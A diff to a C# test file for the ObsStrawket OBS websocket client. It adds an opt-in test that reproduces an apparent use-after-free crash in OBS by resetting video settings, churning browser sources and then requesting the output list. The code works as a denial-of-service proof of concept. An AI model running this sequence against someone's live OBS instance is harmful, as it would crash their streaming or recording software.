@@ -250,7 +250,11 @@ namespace ObsStrawket.Test {
     public async Task TestUiAsync() {
       var client = ClientFlow.GetDebugClient(useChannel: true);
       try {
-        _ = await client.ConnectAsync(Uri, MockServer.Password, cancellation: TestContext.Current.CancellationToken);
+        _ = await client.ConnectAsync(
+          Uri,
+          MockServer.Password,
+          cancellation: TestContext.Current.CancellationToken
+        );
         const string sceneName = "UI test scene";
         const string inputName = "UI test source";
         _ = await client.CreateSceneAsync(
@@ -288,6 +292,130 @@ namespace ObsStrawket.Test {
         );
       }
       finally {
+        await client.CloseAsync();
+        await _obs.RestartAsync();
+      }
+    }
+
+    [Fact(Timeout = 60 * 1000)]
+    public async Task SetVideoSettingsThenGetOutputListCrashPocAsync() {
+      Assert.SkipWhen(
+        Environment.GetEnvironmentVariable("OBSSTRAWKET_RUN_OUTPUT_UAF_POC") != "1",
+        "Set OBSSTRAWKET_RUN_OUTPUT_UAF_POC=1 to run the destructive OBS crash POC."
+      );
+      var client = ClientFlow.GetDebugClient(useChannel: true);
+      var cancellation = TestContext.Current.CancellationToken;
+      try {
+        _ = await client.ConnectAsync(
+          Uri,
+          MockServer.Password,
+          cancellation: cancellation
+        );
+        var outputsBeforeReset = await client.GetOutputListAsync(cancellation);
+        Assert.Contains(
+          outputsBeforeReset.Outputs,
+          static output => output.Kind == "virtualcam_output"
+        );
+        var before = await client.GetVideoSettingsAsync(cancellation);
+        bool alreadyAtReproductionSettings =
+          before.BaseWidth == 1920
+          && before.BaseHeight == 1080
+          && before.OutputWidth == 1920
+          && before.OutputHeight == 1080
+          && before.FpsNumerator == 60000
+          && before.FpsDenominator == 1001;
+        int width = alreadyAtReproductionSettings ? 1280 : 1920;
+        int height = alreadyAtReproductionSettings ? 720 : 1080;
+        int fpsNumerator = alreadyAtReproductionSettings ? 30000 : 60000;
+        const int FpsDenominator = 1001;
+
+        const string ChurnSceneName = "Output UAF POC scene";
+        _ = await client.CreateSceneAsync(
+          ChurnSceneName,
+          cancellation: cancellation
+        );
+        bool crashed = false;
+        string? crashReport = null;
+        for (int attempt = 0; attempt < 8 && !crashed; attempt++) {
+          _obs.RecordOperation(
+            $"Crash POC attempt {attempt + 1}: SetVideoSettings "
+              + $"{width}x{height} {fpsNumerator}/{FpsDenominator}");
+          _ = await client.SetVideoSettingsAsync(
+            fpsNumerator,
+            FpsDenominator,
+            width,
+            height,
+            width,
+            height,
+            cancellation
+          );
+
+          // GetVideoSettings reads the main canvas and does not enumerate outputs.
+          var after = await client.GetVideoSettingsAsync(cancellation);
+          Assert.Equal(width, after.BaseWidth);
+          Assert.Equal(height, after.BaseHeight);
+          Assert.Equal(fpsNumerator, after.FpsNumerator);
+          Assert.False(_obs.HasExited);
+
+          for (int i = 0; i < 64; i++) {
+            string inputName = $"Output UAF POC browser {attempt}-{i}";
+            _ = await client.CreateInputAsync(
+              inputName,
+              "browser_source",
+              sceneName: ChurnSceneName,
+              inputSettings: [],
+              sceneItemEnabled: false,
+              cancellation: cancellation
+            );
+            _ = await client.RemoveInputAsync(
+              inputName: inputName,
+              cancellation: cancellation
+            );
+          }
+          _obs.RecordOperation(
+            $"Crash POC attempt {attempt + 1}: completed allocation churn");
+          _ = await client.GetVideoSettingsAsync(cancellation);
+          Assert.False(_obs.HasExited);
+
+          _obs.RecordOperation(
+            $"Crash POC attempt {attempt + 1}: invoking GetOutputList");
+          var request = client.GetOutputListAsync(cancellation);
+          var report = _obs.WaitForCrashAsync(
+            TimeSpan.FromSeconds(2),
+            cancellation
+          );
+          var completed = await Task.WhenAny(request, report);
+          if (completed == request) {
+            _ = await request;
+          }
+          crashReport = await report;
+          crashed = crashReport != null;
+
+          if (!crashed) {
+            (width, height, fpsNumerator) = width == 1920
+              ? (1280, 720, 30000)
+              : (1920, 1080, 60000);
+          }
+        }
+        if (!crashed) {
+          throw new InvalidOperationException(
+            "GetOutputList did not crash OBS after repeated video resets."
+          );
+        }
+        Assert.Contains("Unhandled exception: c0000005", crashReport);
+        Assert.Contains("obs.dll!obs_output_get_width", crashReport);
+        Assert.Contains(
+          "Utils::Obs::ArrayHelper::GetOutputList",
+          crashReport
+        );
+        Assert.Contains("RequestHandler::GetOutputList", crashReport);
+        Assert.True(_obs.HasExited);
+        Assert.Equal(-1, _obs.ExitCode);
+      }
+      finally {
+        if (client.IsConnected) {
+          await client.CloseAsync();
+        }
         await _obs.RestartAsync();
       }
     }
